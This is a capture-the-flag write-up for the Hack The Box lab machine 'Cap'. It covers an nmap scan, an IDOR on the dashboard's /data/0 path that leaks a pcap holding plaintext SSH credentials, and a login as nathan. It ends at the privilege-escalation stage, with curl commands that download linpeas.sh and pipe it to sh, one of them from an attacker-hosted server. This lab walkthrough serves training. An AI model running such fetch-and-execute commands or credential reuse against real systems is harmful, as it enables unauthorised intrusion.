# Cap Write-up

<img src="https://labs.hackthebox.com/storage/avatars/70ea3357a2d090af11a0953ec8717e90.png" width="200" height="200">

## Recon 

### Port enumeration with NMap

`nmap -sC -sV 10.10.10.245`

    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.3
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
    |   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
    |_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
    80/tcp open  http    gunicorn
    |_http-title: Security Dashboard
    | fingerprint-strings: 
    |   FourOhFourRequest: 
    |     HTTP/1.0 404 NOT FOUND
    |     Server: gunicorn
    |     Date: Tue, 03 Dec 2024 11:35:14 GMT
    |     Connection: close
    |     Content-Type: text/html; charset=utf-8
    |     Content-Length: 232
    |     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
    |     <title>404 Not Found</title>
    |     <h1>Not Found</h1>
    |     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
    |   GetRequest: 
    |     HTTP/1.0 200 OK
    |     Server: gunicorn
    |     Date: Tue, 03 Dec 2024 11:35:05 GMT
    |     Connection: close
    |     Content-Type: text/html; charset=utf-8
    |     Content-Length: 19386
    |     <!DOCTYPE html>
    |     <html class="no-js" lang="en">
    |     <head>
    |     <meta charset="utf-8">
    |     <meta http-equiv="x-ua-compatible" content="ie=edge">
    |     <title>Security Dashboard</title>
    |     <meta name="viewport" content="width=device-width, initial-scale=1">
    |     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
    |     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
    |     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
    |     <link rel="stylesheet" href="/static/css/themify-icons.css">
    |     <link rel="stylesheet" href="/static/css/metisMenu.css">
    |     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
    |     <link rel="stylesheet" href="/static/css/slicknav.min.css">
    |     <!-- amchar
    |   HTTPOptions: 
    |     HTTP/1.0 200 OK
    |     Server: gunicorn
    |     Date: Tue, 03 Dec 2024 11:35:06 GMT
    |     Connection: close
    |     Content-Type: text/html; charset=utf-8
    |     Allow: OPTIONS, HEAD, GET
    |     Content-Length: 0
    |   RTSPRequest: 
    |     HTTP/1.1 400 Bad Request
    |     Connection: close
    |     Content-Type: text/html
    |     Content-Length: 196
    |     <html>
    |     <head>
    |     <title>Bad Request</title>
    |     </head>
    |     <body>
    |     <h1><p>Bad Request</p></h1>
    |     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
    |     </body>
    |_    </html>
    |_http-server-header: gunicorn
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port80-TCP:V=7.94SVN%I=7%D=12/3%Time=674EECE9%P=x86_64-pc-linux-gnu%r(G
    SF:etRequest,2F4C,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\
    SF:x20Tue,\x2003\x20Dec\x202024\x2011:35:05\x20GMT\r\nConnection:\x20close
    SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
    SF:19386\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en\
    SF:">\n\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20
    SF:\x20<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x
    SF:20\x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<me
    SF:ta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sca
    SF:le=1\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"im
    SF:age/png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\x
    SF:20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css
    SF:\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/
    SF:font-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\
    SF:x20href=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20r
    SF:el=\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x20
    SF:\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.mi
    SF:n\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/stati
    SF:c/css/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOpt
    SF:ions,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Tue,
    SF:\x2003\x20Dec\x202024\x2011:35:06\x20GMT\r\nConnection:\x20close\r\nCon
    SF:tent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20OPTIONS,\x20HEAD
    SF:,\x20GET\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1
    SF:\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20t
    SF:ext/html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\
    SF:x20\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<bod
    SF:y>\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Inv
    SF:alid\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;R
    SF:TSP/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,
    SF:189,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x
    SF:20Tue,\x2003\x20Dec\x202024\x2011:35:14\x20GMT\r\nConnection:\x20close\
    SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x202
    SF:32\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\
    SF:x20Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</
    SF:h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20
    SF:server\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x2
    SF:0check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

### WEB 

![image](https://github.com/user-attachments/assets/ad734ab8-84dc-47ab-95aa-957270f3dd59)

IP config

![image](https://github.com/user-attachments/assets/f92207a3-25e2-4916-9916-64f7a61cc292)

Network Status

Security Snapshot

![image](https://github.com/user-attachments/assets/e9e48544-a992-4873-ab77-2ff74b04ffeb)

## Exploitation 

### IDOR

http://10.10.10.245/data/0

![image](https://github.com/user-attachments/assets/3a7f9411-16db-4c4d-8934-b43ee62cb419)

0.pcap

![image](https://github.com/user-attachments/assets/54407fd9-171b-410c-93ba-183c870c7876)

Credentials

`nathan`:`Buck3tH4TF0RM3!`

### SSH

Connect to SSH via `nathan` credetials!

    ssh nathan@10.10.10.245

Get the user flag!

![image](https://github.com/user-attachments/assets/6dc06f66-6358-4971-9cf8-d16cfc49df59)

### Privelege Escalation 

[LinPeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)

[![asciicast](https://asciinema.org/a/250532.png)](https://asciinema.org/a/309566)

You can run linpeas from github

    curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

Or get it localy and run it. 

    # on host
    wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

    python3 -m http.server 80

    # on victim

    curl -l http://your-address/linpeas.sh | sh


